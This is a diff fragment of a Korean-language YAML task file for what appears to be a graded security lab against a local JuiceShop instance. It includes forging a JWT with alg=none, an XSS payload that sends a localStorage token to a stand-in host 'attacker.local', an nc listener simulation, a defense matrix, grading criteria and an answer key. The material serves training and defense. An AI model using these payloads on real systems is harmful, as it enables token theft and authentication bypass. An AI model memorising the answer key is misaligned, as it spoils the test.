-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
-    정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
-    답변에 직접 quote** 해야 채점 통과.'
-  bastion_prompt: "[복합 시나리오 — w06 JWT 변조 + XSS 토큰 탈취 chain]\n\nJuiceShop (http://10.20.32.80)\
-    \ 인증 자격증명 chain 공격 점검 3 phase.\n\nPhase A (JWT alg 변조):\n1) `curl -s -X POST -H\
-    \ \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op\",\"password\"\
-    :\"admin123\"}'\n    http://10.20.32.80/rest/user/login` 응답에서 JWT 획득.\n2) python3\
-    \ 으로 alg=none 변조 토큰 생성:\n   `python3 -c \"import base64; h=base64.urlsafe_b64encode(b'{\\\
-    \"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}').rstrip(b'=').decode();\n   \
-    \ p='<원본 payload base64>'; print(f'{h}.{p}.')\"`\n3) `curl -i -H \"Authorization:\
-    \ Bearer <변조>\" http://10.20.32.80/rest/user/whoami` 결과 캡처.\n   (보통 거부됨 — 그게 JuiceShop\
-    \ 의 정상 동작)\n\nPhase B (XSS payload + JWT 탈취 시뮬레이션):\nXSS payload 텍스트 출력: `<script>fetch('http://attacker.local/steal?t='+localStorage.getItem('token'))</script>`\n\
-    공격자 측 수신 시뮬: `nc -lk 9999 &` 후 다른 터미널에서 `curl \"http://localhost:9999/steal?t=FAKEJWT\"\
-    `.\n`kill %1` 로 nc 종료. 토큰 탈취 흐름 PoC.\n\nPhase C (방어 매트릭스):\n```\n| 위협 | 공격면 |\
-    \ 방어 1 | 방어 2 | 잔존 위험 |\n| JWT alg 변조 | server alg whitelist | strict alg check\
-    \ | RS256 사용 | key leak |\n| localStorage 탈취 | XSS | HttpOnly Cookie 사용 | CSP\
-    \ 설정 | XSS+CSRF chain |\n| Cookie 탈취 | XSS + Cookie 접근 | HttpOnly + Secure | SameSite=Strict\
-    \ | network mitm |\n| Refresh token 탈취 | 영구 자격증명 | rotation + short TTL | device\
-    \ binding | refresh leak |\n```\n표 끝에 \"JuiceShop 권고: alg whitelist + HttpOnly\
-    \ Cookie + SameSite=Strict + refresh rotation\" 한 줄.\n\n종료: echo \"=== Phase A\
-    \ JWT 변조 ===\" / \"=== Phase B XSS 탈취 ===\" / \"=== Phase C 매트릭스 ===\" 묶음.\n\n\
-    반드시 3 phase 모두 실행. 중간 종료 금지.\n\n[도구 권장] integration_scenario: 여러 도구 chain — 정찰\
-    \ (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain —\
-    \ 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업** 등 적합 도구로 호출 후 stdout quote."
-  hint: 'Phase A: JWT alg=none 은 RFC 7519 의 "unsecured JWS". 라이브러리 별로 차단 정책 다름.
-
-    Phase B: nc -lk 로 localhost 수신, curl 로 발신 — 외부 callback 없이 자체 시뮬레이션.
-
-    Phase C: 4행 매트릭스. JuiceShop 권고 한 줄.
-
-    포인트: 단일 취약점이 아닌 *chain* — JWT 변조 + XSS 가 동시면 자격증명+권한 동시 탈취.
-
-    '
-  category: integration_scenario
-  points: 50
-  verify:
-    type: output_contains
-    expect: 매트릭스
-    field: stdout
-    semantic:
-      intent: 'JWT alg=none 변조 + XSS 토큰 탈취 chain 점검 + 자격증명 방어 매트릭스.
-
-        lecture #1·#2·#3 + lab #7·#8·#9·#6 동시 행동 증명.
-
-        '
-      success_criteria:
-      - Phase A — 원본 JWT 획득 + alg=none 변조 토큰 생성 + whoami 시도
-      - Phase B — XSS payload 텍스트 + nc/curl 토큰 탈취 시뮬레이션
-      - Phase C — 4행 매트릭스 + 종합 권고 한 줄
-      acceptable_methods:
-      - curl POST login + python3 base64 변조
-      - nc -lk + curl 자체 시뮬
-      - markdown table 매트릭스
-      - jwt_tool / pyjwt 추가 가능
-      negative_signs:
-      - JWT 획득만 하고 변조 안 함
-      - XSS payload 만 작성하고 탈취 시뮬 누락
-      - 매트릭스 누락 또는 2행 이하
-      - chain 관점 (JWT+XSS 동시) 분석 누락
-  target_vm: attacker
-  risk_level: low
-  answer: '🤖 위 bastion_prompt 그대로. JWT 변조 → XSS 시뮬 → 매트릭스 echo.
-
-    '
-  answer_detail: 'JWT alg=none 은 학술적 우회 — JuiceShop 은 차단됨. 그 *시도 자체* 가 학습 목표.
-
-    XSS 탈취는 nc 자체 callback 으로 시뮬. 핵심은 *chain* 관점 — 두 취약점이 결합 시 영향 폭증.
-
-    '
-  script: ''
+        - "cleanup 실행 후 확인 없음"
+        - "dashboard 접속 안 함"
+        - "해석 누락"
+    target_vm: attacker
+    risk_level: low
